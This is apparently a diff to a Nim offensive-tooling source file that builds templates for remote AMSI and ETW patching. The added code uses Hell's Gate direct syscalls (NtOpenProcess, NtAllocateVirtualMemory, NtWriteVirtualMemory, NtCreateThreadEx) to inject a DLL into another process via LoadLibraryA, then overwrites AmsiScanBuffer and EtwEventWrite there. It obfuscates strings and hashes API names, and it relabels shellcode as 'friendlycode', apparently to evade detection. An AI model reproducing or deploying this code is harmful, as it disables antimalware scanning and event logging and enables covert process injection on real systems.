@@ -1,7 +1,19 @@
 import strformat
 import strutils
 
+let DInvokeGetModuleHandleADelegate* = """
 
+type
+  GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
+
+const
+  GetModuleHandleA_HASH * = obf("GetModuleHandleA")
+
+var MyGetModuleHandleA*: GetModuleHandleA_t
+
+MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
+
+"""
 
 let HellsgateAllocDelegate*  = """
 
@@ -256,70 +268,94 @@ when isMainModule:
 
 let HellsgateRemotePatchAMSIStub* = """
 
-proc remoteLoadLib(var processID: DWORD): void =
+proc remoteLoadAmsi(processID: var DWORD): bool =
 
    
     # C:\windows\system32\amsi.dll
-    var shellcode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
+    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
      char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
      char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
 
 
     echo "[*] Target Process: ", processID
 
-    let pHandle = OpenProcess(
-        PROCESS_ALL_ACCESS, 
-        false, 
-        cast[DWORD](processID)
-    )
-    defer: CloseHandle(pHandle)
+    var status: NTSTATUS
+    var success: BOOL
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
 
-    echo "[*] pHandle: ", pHandle
+    cid.UniqueProcess = processID
 
-    let rPtr = VirtualAllocEx(
-        pHandle,
-        NULL,
-        cast[SIZE_T](shellcode.len),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
-    )
-
-    var bytesWritten: SIZE_T
-    let wSuccess = WriteProcessMemory(
-        pHandle, 
-        rPtr,
-        addr shellcode,
-        cast[SIZE_T](shellcode.len),
-        addr bytesWritten
-    )
+    if getSyscall(ntOpenTable):
+        syscall = ntOpenTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtOpenProcess")
     
-    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
- 
-    echo "[*] WriteProcessMemory: ", bool(wSuccess)
-    echo "    \\-- bytes written: ", bytesWritten
-    echo ""
-
-    let tHandle = CreateRemoteThread(
-        pHandle, 
-        NULL,
-        0,
-        pfnThreadRtn,
-        rPtr, 
-        0, 
-        NULL
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
     )
-    defer: CloseHandle(tHandle)
 
-    echo "[*] tHandle: ", tHandle
-    echo "[+] Injected"
+    echo obf("[*] NtOpenProcess: "), status
 
-    var oldProtect: PDWORD = nil
-    var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
-    echo $GetLastError()
-    echo status
+    if getSyscall(ntAllocTable):
+        syscall = ntAllocTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
-when isMainModule:
-    remoteLoadLib(remoteProcID)
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+    echo obf("[*] NtAllocateVirtualMemory: "), status
+    var bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+        syscall = ntWriteTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+
+    if getSyscall(ntCreateTable):
+        syscall = ntCreateTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        pfnThreadRtn, 
+        ds, FALSE, 0, 0, 0, NULL)
+
+    if getSyscall(ntCloseTable):
+        syscall = ntCloseTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtClose")
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+    if(status == 0):
+      return true
+    else:
+      return false
+
 
 proc RemotePatchAmsi(hProcss :HANDLE): bool =
 
@@ -341,34 +377,170 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
 
-    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
-        return disabled
+    var oldProtection: DWORD = 0
+    var success: BOOL
+    var protectAddress = RemoteProc
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    var 
+        status          : NTSTATUS          = 0x00000000
+        buffer          : LPVOID
+
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[*] Applying Syscall ETW patch")
     else:
-        disabled = true
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+    var 
+        bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+
+        syscall = ntWriteTable.wSysCall
+        var outLength: SIZE_T
+        status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to write memory.")
+        else:
+            echo obf("[+] NtWriteVirtualMemory Succeed!")
+                
+               
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[+] OldProtect set back")
+            disabled = true
+    else:
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+
+    #if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+    #    echo obf("Failed to write process memory")
+    #    return disabled
+    #else:
+    #    disabled = true
     return disabled
 
 when isMainModule:
     var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchAmsi(hProcams)
+    if (success == 0):
+        success = remoteLoadAmsi(remoteProcID)
+        HowMuchTimeWouldYoulikeToSleep(2)
+        success = RemotePatchAmsi(hProcetw)
     echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
 
 let HellsgateRemotePatchETWStub* = """
 
-proc remoteLoadLib(var processID: DWORD): void =
+proc remoteLoadNtdll(processID: var DWORD): bool =
 
     # C:\windows\system32\ntdll.dll
-    var shellcode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
+    var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
     char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]
 
 
-
     echo "[*] Target Process: ", processID
 
+    var status: NTSTATUS
+    var success: BOOL
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+    cid.UniqueProcess = processID
+
+    if getSyscall(ntOpenTable):
+        syscall = ntOpenTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtOpenProcess")
+    
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
+    )
+
+    echo obf("[*] NtOpenProcess: "), status
+
+    if getSyscall(ntAllocTable):
+        syscall = ntAllocTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+    echo obf("[*] NtAllocateVirtualMemory: "), status
+    var bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+        syscall = ntWriteTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+
+    if getSyscall(ntCreateTable):
+        syscall = ntCreateTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        pfnThreadRtn, 
+        ds, FALSE, 0, 0, 0, NULL)
+
+    if getSyscall(ntCloseTable):
+        syscall = ntCloseTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtClose")
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+    if(status == 0):
+      return true
+    else:
+      return false
+#[
     let pHandle = OpenProcess(
         PROCESS_ALL_ACCESS, 
         false, 
@@ -395,7 +567,7 @@ proc remoteLoadLib(var processID: DWORD): void =
         addr bytesWritten
     )
     
-    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(r"Kernel32.dll"), r"LoadLibraryA"));
  
     echo "[*] WriteProcessMemory: ", bool(wSuccess)
     echo "    \\-- bytes written: ", bytesWritten
@@ -419,9 +591,7 @@ proc remoteLoadLib(var processID: DWORD): void =
     var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
     echo $GetLastError()
     echo status
-
-when isMainModule:
-    remoteLoadLib(remoteProcID)
+    ]#
 
 proc RemotePatchEtw(hProcess : HANDLE) : bool =
 
@@ -442,18 +612,78 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         echo obf("[X] Failed to get the address of 'EtwEventWrite'")
         return disabled
 
-    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
-        return disabled
+    var oldProtection: DWORD = 0
+    var success: BOOL
+    var protectAddress = RemoteProc
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    var 
+        status          : NTSTATUS          = 0x00000000
+        buffer          : LPVOID
+
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[*] Applying Syscall ETW patch")
     else:
-        disabled = true
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+    var 
+        bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+
+        syscall = ntWriteTable.wSysCall
+        var outLength: SIZE_T
+        status = NtWriteVirtualMemory(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to write memory.")
+        else:
+            echo obf("[+] NtWriteVirtualMemory Succeed!")
+                
+               
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[+] OldProtect set back")
+            disabled = true
+    else:
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+
+    #if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+    #    echo obf("Failed to write process memory")
+    #    return disabled
+    #else:
+    #    disabled = true
     return disabled
 
 when isMainModule:
-    var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchEtw(hProcetw)
+    if (success == 0):
+        success = remoteLoadNtdll(remoteProcID)
+        HowMuchTimeWouldYoulikeToSleep(2)
+        success = RemotePatchEtw(hProcetw)
     echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
-
+    
 """
 
 let HellsgateAMSIPatchStub*  = """
